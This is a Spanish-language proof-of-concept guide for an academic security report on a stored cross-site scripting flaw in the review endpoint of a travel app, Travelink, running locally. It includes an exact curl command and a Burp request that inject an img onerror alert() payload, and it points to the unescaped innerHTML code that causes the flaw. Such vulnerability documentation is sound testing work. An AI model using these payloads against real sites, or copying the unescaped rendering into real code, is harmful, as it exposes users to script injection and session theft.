# Guía de Prueba de Concepto: PoC-02 — Cross-Site Scripting Almacenado (Stored XSS) en Reseñas

**Vulnerabilidad:** H-06 — Stored XSS en Calificaciones de Tours y Agencias  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
**OWASP Top 10:2021:** A03:2021 - Injection  
**Severidad:** Alta  
**Clasificación:** CONFIRMADO EN CÓDIGO  

---

## 1. Descripción Técnica del Fallo
El endpoint `POST /api/calificar` permite a un usuario registrar calificaciones y comentarios sobre tours y agencias. En `CalificarHandler.java:220-224`, las cadenas se serializan hacia JSON escapando únicamente caracteres de control mediante `jsonEscape()`, pero sin saneamiento de etiquetas HTML. En el frontend, `detalle.js:343-355` toma el campo `c.comentario` y `c.turista` y los concatena directamente dentro de una plantilla asignada a `contComentarios.innerHTML`. Al no codificar entidades HTML (`&lt;`, `&gt;`), cualquier etiqueta inyectada (como `<img src=x onerror=...>`) se ejecuta en el navegador de cualquier usuario o administrador que visite la página del tour.

---

## 2. Precondiciones
1. App local levantada en `http://127.0.0.1:8080`.
2. Tour con ID `1` existente en la base de datos (creado en el seed).

---

## 3. Procedimiento de Ejecución Manual (Request Exacta)

### Paso 1: Inyección del Payload Inocuo en la Base de Datos
Ejecutar la siguiente petición con `curl` para almacenar la reseña con un vector XSS no destructivo (payload benigno):

```bash
curl -i -s -X POST "http://127.0.0.1:8080/api/calificar" \
     -H "Content-Type: application/json" \
     -d '{
       "idReserva": 500,
       "idAgencia": 1,
       "estrellas": 5,
       "comentario": "Excelente viaje <img src=x onerror=\"alert(\x27XSS-TRAVELINK-EVIDENCIA\x27)\"> Muy recomendado"
     }'
```

### Formato para Burp Suite Repeater:
```http
POST /api/calificar HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0
Content-Type: application/json
Accept: application/json
Content-Length: 172
Connection: close

{
  "idReserva": 500,
  "idAgencia": 1,
  "estrellas": 5,
  "comentario": "Excelente viaje <img src=x onerror=\"alert('XSS-TRAVELINK-EVIDENCIA')\"> Muy recomendado"
}
```

### Paso 2: Verificación de la Ejecución en el Navegador
1. Abrir Google Chrome / Edge e ingresar a: `http://127.0.0.1:8080/html/turista/detalle.html?id=1`
2. Desplazarse a la sección inferior de comentarios y calificaciones.

---

## 4. Respuesta Esperada
- **En la API (`POST /api/calificar`):**
  - Código: `200 OK`
  - Body: `{"status":"success","message":"Calificación registrada con éxito"}`
- **En el Navegador (`detalle.html`):**
  - El navegador descarga el comentario desde `GET /api/calificar?idTour=1`.
  - El script `detalle.js` inyecta la cadena en `innerHTML`.
  - Se desencadena la ventana emergente modal `alert('XSS-TRAVELINK-EVIDENCIA')` evidenciando la ejecución de código JavaScript en el contexto del origen `http://127.0.0.1:8080`.

---

## 5. Qué Capturar para el Informe Académico
1. **Burp / Terminal:** Captura de la petición `POST /api/calificar` con el payload y la respuesta `200 OK`.
2. **Navegador Web:** Captura de pantalla de la ventana modal emergente (`alert`) superpuesta sobre la interfaz web de Travelink en `http://127.0.0.1:8080/html/turista/detalle.html?id=1`.
3. **Inspector de Elementos (F12):** Captura de la pestaña *Elements* mostrando la etiqueta `<img src="x" onerror="alert(...)">` insertada en el DOM dentro del `div` de comentarios.

---

## 6. Resultado Real (Completar tras la prueba)
*(Espacio reservado para el evaluador)*

```text

```
